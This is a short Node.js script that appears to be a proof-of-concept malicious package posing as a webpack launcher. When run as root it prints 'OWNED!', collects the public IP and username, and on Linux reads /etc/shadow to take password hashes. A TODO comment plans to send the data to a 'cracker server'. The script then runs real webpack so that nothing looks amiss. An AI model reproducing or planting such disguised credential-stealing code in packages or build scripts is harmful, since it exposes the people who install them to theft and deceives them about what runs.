#! /usr/bin/env node
'use strict';

const chalk = require('chalk');
const isRoot = require('is-root');
const network = require('network');
const os = require('node.os');
const shell = require('shelljs');
const username = require('username');

if (isRoot()) {
    console.log(chalk.red('OWNED!'));
    
    //get public IP
    network.get_public_ip(function(err, ip) {
        console.log(chalk.red(err || ip));
    });

    //get username
    username().then(username => {
        console.log(chalk.red(username));
    });

    //get OS and steal some hashed passwords
    let platform = os.os;
    if (platform == 'osx') {
        console.log(chalk.green('TODO osx'));
    } else if (platform == 'win') {
        console.log(chalk.green('TODO windows'));
    } else if (platform == 'linux' || os.platform == 'linux') {
        console.log(chalk.red(shell.exec('cat /etc/shadow')));
    } else {
        console.log(chalk.green('What OS iz diz?!'));
        console.log(chalk.green(platform));
        console.log(chalk.green(os.platform));
    }
    
    //TODO - Send all data to cracker server ...
    
}

// Still run actual webpack so things look normal
shell.exec('./node_modules/webpack/bin/webpack.js');
